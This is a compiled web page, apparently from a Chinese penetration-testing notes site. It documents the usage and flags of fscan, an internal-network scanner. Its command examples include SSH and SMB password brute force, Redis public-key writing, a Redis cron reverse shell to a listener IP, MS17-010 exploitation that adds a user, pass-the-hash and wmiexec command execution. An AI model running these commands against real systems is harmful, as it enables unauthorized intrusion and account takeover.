import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as e,o as p,c as t,a,d as l,b as i,e as r}from"./app-rrNGl4lL.js";const c={},o=a("h1",{id:"内网信息收集",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#内网信息收集"},[a("span",null,"内网信息收集")])],-1),u=a("h2",{id:"fscan",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#fscan"},[a("span",null,"fscan")])],-1),v={href:"https://github.com/shadow1ng/fscan",target:"_blank",rel:"noopener noreferrer"},d=r(`<p>简单用法</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24  <span class="token punctuation">(</span>默认使用全部模块<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/16  <span class="token punctuation">(</span>B段扫描<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>其他用法</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-np</span> <span class="token parameter variable">-no</span> -nopoc<span class="token punctuation">(</span>跳过存活检测 、不保存文件、跳过web poc扫描<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-rf</span> id_rsa.pub <span class="token punctuation">(</span>redis 写公钥<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-rs</span> <span class="token number">192.168</span>.1.1:6666 <span class="token punctuation">(</span>redis 计划任务反弹shell<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-c</span> <span class="token function">whoami</span> <span class="token punctuation">(</span>ssh 爆破成功后，命令执行<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> <span class="token function">ssh</span> <span class="token parameter variable">-p</span> <span class="token number">2222</span> <span class="token punctuation">(</span>指定模块ssh和端口<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-pwdf</span> pwd.txt <span class="token parameter variable">-userf</span> users.txt <span class="token punctuation">(</span>加载指定文件的用户名、密码来进行爆破<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-o</span> /tmp/1.txt <span class="token punctuation">(</span>指定扫描结果保存路径,默认保存在当前路径<span class="token punctuation">)</span> 
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/8  <span class="token punctuation">(</span>A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 <span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> smb <span class="token parameter variable">-pwd</span> password <span class="token punctuation">(</span>smb密码碰撞<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> ms17010 <span class="token punctuation">(</span>指定模块<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-hf</span> ip.txt  <span class="token punctuation">(</span>以文件导入<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-u</span> http://baidu.com <span class="token parameter variable">-proxy</span> <span class="token number">8080</span> <span class="token punctuation">(</span>扫描单个url,并设置http代理 http://127.0.0.1:8080<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-nobr</span> <span class="token parameter variable">-nopoc</span> <span class="token punctuation">(</span>不进行爆破,不扫Web poc,以减少流量<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-pa</span> <span class="token number">3389</span> <span class="token punctuation">(</span>在原基础上,加入3389-<span class="token operator">&gt;</span>rdp扫描<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-socks5</span> <span class="token number">127.0</span>.0.1:1080 <span class="token punctuation">(</span>只支持简单tcp功能的代理,部分功能的库不支持设置代理<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> ms17010 <span class="token parameter variable">-sc</span> <span class="token function">add</span> <span class="token punctuation">(</span>内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> smb2 <span class="token parameter variable">-user</span> admin <span class="token parameter variable">-hash</span> xxxxx <span class="token punctuation">(</span>pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4<span class="token punctuation">)</span>
fscan.exe <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.1/24 <span class="token parameter variable">-m</span> wmiexec <span class="token parameter variable">-user</span> admin <span class="token parameter variable">-pwd</span> password <span class="token parameter variable">-c</span> xxxxx <span class="token punctuation">(</span>wmiexec无回显命令执行<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完整参数:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>  <span class="token parameter variable">-c</span> string
        ssh命令执行
  <span class="token parameter variable">-cookie</span> string
        设置cookie
  <span class="token parameter variable">-debug</span> int
        多久没响应,就打印当前进度<span class="token punctuation">(</span>default <span class="token number">60</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-domain</span> string
        smb爆破模块时,设置域名
  <span class="token parameter variable">-h</span> string
        目标ip: <span class="token number">192.168</span>.11.11 <span class="token operator">|</span> <span class="token number">192.168</span>.11.11-255 <span class="token operator">|</span> <span class="token number">192.168</span>.11.11,192.168.11.12
  <span class="token parameter variable">-hf</span> string
        读取文件中的目标
  <span class="token parameter variable">-hn</span> string
        扫描时,要跳过的ip: <span class="token parameter variable">-hn</span> <span class="token number">192.168</span>.1.1/24
  <span class="token parameter variable">-m</span> string
        设置扫描模式: <span class="token parameter variable">-m</span> <span class="token function">ssh</span> <span class="token punctuation">(</span>default <span class="token string">&quot;all&quot;</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-no</span>
        扫描结果不保存到文件中
  <span class="token parameter variable">-nobr</span>
        跳过sql、ftp、ssh等的密码爆破
  <span class="token parameter variable">-nopoc</span>
        跳过web poc扫描
  <span class="token parameter variable">-np</span>
        跳过存活探测
  <span class="token parameter variable">-num</span> int
        web poc 发包速率  <span class="token punctuation">(</span>default <span class="token number">20</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-o</span> string
        扫描结果保存到哪 <span class="token punctuation">(</span>default <span class="token string">&quot;result.txt&quot;</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-p</span> string
        设置扫描的端口: <span class="token number">22</span> <span class="token operator">|</span> <span class="token number">1</span>-65535 <span class="token operator">|</span> <span class="token number">22,80</span>,3306 <span class="token punctuation">(</span>default <span class="token string">&quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-pa</span> string
        新增需要扫描的端口,-pa <span class="token number">3389</span> <span class="token punctuation">(</span>会在原有端口列表基础上,新增该端口<span class="token punctuation">)</span>
  <span class="token parameter variable">-path</span> string
        fcgi、smb romote <span class="token function">file</span> path
  <span class="token parameter variable">-ping</span>
        使用ping代替icmp进行存活探测
  <span class="token parameter variable">-pn</span> string
        扫描时要跳过的端口,as: <span class="token parameter variable">-pn</span> <span class="token number">445</span>
  <span class="token parameter variable">-pocname</span> string
        指定web poc的模糊名字, <span class="token parameter variable">-pocname</span> weblogic
  <span class="token parameter variable">-proxy</span> string
        设置代理, <span class="token parameter variable">-proxy</span> http://127.0.0.1:8080
  <span class="token parameter variable">-user</span> string
        指定爆破时的用户名
  <span class="token parameter variable">-userf</span> string
        指定爆破时的用户名文件
  <span class="token parameter variable">-pwd</span> string
        指定爆破时的密码
  <span class="token parameter variable">-pwdf</span> string
        指定爆破时的密码文件
  <span class="token parameter variable">-rf</span> string
        指定redis写公钥用模块的文件 <span class="token punctuation">(</span>as: <span class="token parameter variable">-rf</span> id_rsa.pub<span class="token punctuation">)</span>
  <span class="token parameter variable">-rs</span> string
        redis计划任务反弹shell的ip端口 <span class="token punctuation">(</span>as: <span class="token parameter variable">-rs</span> <span class="token number">192.168</span>.1.1:6666<span class="token punctuation">)</span>
  <span class="token parameter variable">-silent</span>
        静默扫描,适合cs扫描时不回显
  <span class="token parameter variable">-sshkey</span> string
        ssh连接时,指定ssh私钥
  <span class="token parameter variable">-t</span> int
        扫描线程 <span class="token punctuation">(</span>default <span class="token number">600</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-time</span> int
        端口扫描超时时间 <span class="token punctuation">(</span>default <span class="token number">3</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-u</span> string
        指定Url扫描
  <span class="token parameter variable">-uf</span> string
        指定Url文件扫描
  <span class="token parameter variable">-wt</span> int
        web访问超时时间 <span class="token punctuation">(</span>default <span class="token number">5</span><span class="token punctuation">)</span>
  <span class="token parameter variable">-pocpath</span> string
        指定poc路径
  <span class="token parameter variable">-usera</span> string
        在原有用户字典基础上,新增新用户
  <span class="token parameter variable">-pwda</span> string
        在原有密码字典基础上,增加新密码
  <span class="token parameter variable">-socks5</span>
        指定socks5代理 <span class="token punctuation">(</span>as: <span class="token parameter variable">-socks5</span>  socks5://127.0.0.1:1080<span class="token punctuation">)</span>
  <span class="token parameter variable">-sc</span> 
        指定ms17010利用模块shellcode,内置添加用户等功能 <span class="token punctuation">(</span>as: <span class="token parameter variable">-sc</span> <span class="token function">add</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function m(b,k){const n=e("ExternalLinkIcon");return p(),t("div",null,[o,u,a("blockquote",null,[a("p",null,[a("a",v,[l("shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。"),i(n)])])]),d])}const x=s(c,[["render",m],["__file","index.html.vue"]]),g=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"内网信息收集","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"fscan","slug":"fscan","link":"#fscan","children":[]}],"git":{"createdTime":1731668893000,"updatedTime":1731668893000,"contributors":[{"name":"233","email":"ayusummer233@vip.qq.com","commits":1}]},"readingTime":{"minutes":2.96,"words":889},"filePathRelative":"网络安全/内网渗透/信息收集/index.md","localizedDate":"2024年11月15日","excerpt":"\\n<h2>fscan</h2>\\n<blockquote>\\n<p><a href=\\"https://github.com/shadow1ng/fscan\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</a></p>\\n</blockquote>\\n<p>简单用法</p>\\n<div class=\\"language-bash\\" data-ext=\\"sh\\" data-title=\\"sh\\"><pre class=\\"language-bash\\"><code>fscan.exe <span class=\\"token parameter variable\\">-h</span> <span class=\\"token number\\">192.168</span>.1.1/24  <span class=\\"token punctuation\\">(</span>默认使用全部模块<span class=\\"token punctuation\\">)</span>\\nfscan.exe <span class=\\"token parameter variable\\">-h</span> <span class=\\"token number\\">192.168</span>.1.1/16  <span class=\\"token punctuation\\">(</span>B段扫描<span class=\\"token punctuation\\">)</span>\\n</code></pre></div>"}');export{x as comp,g as data};
